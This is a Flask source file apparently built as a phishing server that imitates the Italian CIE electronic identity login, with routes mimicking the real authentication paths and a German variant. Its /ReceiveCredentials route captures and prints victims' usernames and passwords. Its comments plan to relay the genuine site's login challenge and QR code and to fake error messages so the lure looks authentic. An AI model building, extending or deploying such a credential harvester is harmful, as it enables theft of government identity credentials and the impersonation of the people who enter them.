from flask import Flask, render_template, request
import random

app = Flask(__name__)

random.seed()
context = { 
   'landing_page': {
       'node': random.randrange(1, 7) # to simulate real behavior, this will change every time
   },

   'cie_login': {
       # once we send the actual request, we will get the html of it.
       # We will extract the qr string and assign this to it, which
       # is what we want to be used for the login
       'qr_str': "iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6AQAAAACgl2eQAAAFTklEQVR4Xu2ZTarrOBSEj/FAs2QDAm3DM28p3oCTbCDZkmbahsAbcGYaCKu/k7R9b78HDxqJhoZrwiU/FWLZVXWqdKX8+fDy6zu/HD+Az/ED+Bz/ESCJjPac4tnb2eQpyTm51chJ5NwMULZhKX55BldCPpks0r9K2cbybAaIp1Eu/GKSecgX6R9j7ny/DX1LwJBl1EXdBjuP8SJuHd2jLWCMrG4WmbxwXL27ydIUwJXs76HnnW3g6lkZ4rUs/7zUlQCRgV/87fGdML9/+q8AevSvtKxSeNykv/HryT0PVtcDEgR2D6WxfTOZKxkvJk7BXlsBSta7M9qJ0xhtB6C4dVDW7SdZDUhZjJ1CX3w+jctjtCfzJomJ+0lWA8ry9PHq82VYXj6zTGUgPD8o1wAQL+OyDtIVxFLuQWaEY/obZ9IKkNzdRxnKJnnysSvxnOzF5K4cwqkHYCncoIVfx2TOQYVzTv06Hpe6GsBvhbKOAh9eYdkEnebT4B5yEKYewK23U+F+yWygnL36pQTc2LUDlBJYZv/y5e7dXZ/Yy2C79E3+lYBkT9iXkQn7Qp5KtoW1bwPfagRggdyat708Rn15DlgB3Pi6krWA98xSbwkMRMcFxJDxAU5gp1w1AG0muYY8DzIFfWvysA6rPC51PYAxhfbj5N3LSxfyxSgf1jFfmwH6u2dRUI6/OtwZW5jzMx0OUw9wq2DF0iXbKffilLB6WJ33ZTYAPDFJY6/Yl8FtlHvqMF9Xsh5QmLOMQmLJaogosGIpOlwOTtYDmIMEOXwGvZTVLA8DH1j1IZxqQHLbSBwFQFZE+FDObYQis0/eBoB4DfiwvciCal4qSXf7zuoGAIIozy1x9IyPMV8CX5GT0VW3ARRN0RD4JqwXPvC8vw2x8wcf6gEQgLvjeLaKKLH9sjF5Rd9pBGAIMtMZvowSTkAVJCaf07JrsxqQYDUy5CWJEb7lkxBaCKUH5aoByDyRT1ipnUmkxNEglwGHOYZ7PSBqb1Lt4GCkLDyzvAJXcmd1PSDZcyBFI5n+pT6shkmAPIdj4lQD+Ei4U1HTNRGR1ilvKX35QzUAMlBzDO2M3KiT/WH6Z1IfaAbQqEAQotQQrrhZ/aaJlJfHMhsAuJjXRCWnd6DHvgTaAdHroH09wD1GaKw1ZNPWjBuTUigLfNQKYFU11JC3Nu8Ft/wQ75i81YCEZcFhtFNoBC88mRRkEM6eH+oBTN6Sp0I7kCs+TJDQ9P4xhEaARFAnKOK9CEcztqYgysIh/xaAjhoojCowDge+F5oI8tyHewOAkBkoUMwpksmJICE9rP5y+3oAR0Cb/cq09RScBbKRsbf3zkwjQJzl3cs8TZbwU166P8asPORfD6DOZFVKcLoxwqeaH7JaWTvAzCihYwbshUqLbUIJPnOlFQDL9bkLVtuB/zRBHAbtHNqsBywaGxIBnoKTJ1SjiYuXB6urAYWa+a7kyen88rojKqJ3cBdvPcA9DEqPHdpP5GqIgdvjk3anXD0AM9HhWyj+A/VfdxgotjSF0gqQkKEORB6zJnbV5lOnzGGk9QC0aWdD5VTP7/ir9VDjxM6HekDW7S+vu0l4vujYksvI87IvsxrAkZiMupukM0sTF6f03mZvBdBdVpSimFfS/dWnj53u67q/z6EBAEt0N8MJ6EB8DFY395hZXwOlHqBbhScD5cr6Ljv0qdVoH9nPoQlAx6Lm6veGHgolP1y1srUE3BOj1m2jtoNZ20HUxNUMoP9DuZkoRjf3aAdM3pNY6N0OAB9IVu89QxPnEWeOZMXtqzVXA/54/AA+xw/gc/w/AH8BVmEqlQLHnOcAAAAASUVORK5CYII="
   }
}

# TODO:
# - implement qr code CIE login
# - implement actual login
# - remove hardcoded challenges and similar. They will all be sent as parameters
# - how to make "Credenziali non valide" appear on wrong username/psw


# QR code functioning:
# when we press "login with CIE", we get redirected to a login page
# with some parameters, one of them being the challenge. With this
# challenge the website generates the QR code (qr source is @ line
# 490 in login_cie.html). Perhaps the best course of action is to 
# simply do the login and pass that field as argument to login_cie,
# so that it can display the correct QR code


@app.route('/')
def landing_page():
    return render_template('landing_page.html', **context['landing_page'])


@app.route('/AuthRequestCieService/', methods=['GET', 'POST'])
def login_cie():
    lang = request.args.get('lang') 
    page = "login_cie.html"

    if lang == "deu":
        page = "login_cie_deu.html"

    return render_template(page, **context['cie_login'])


@app.route('/ReceiveCredentials', methods=['POST'])
def receive():
    lang = request.form.get('lang')
    print(f"Username is {request.form.get('username')}")
    print(f"Password is {request.form.get('password')}")
    print(f"Lang is {lang}")

    page = "cie_waiting.html"

    if lang == "deu":
        page = "cie_waiting_deu.html"

    return render_template(page)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
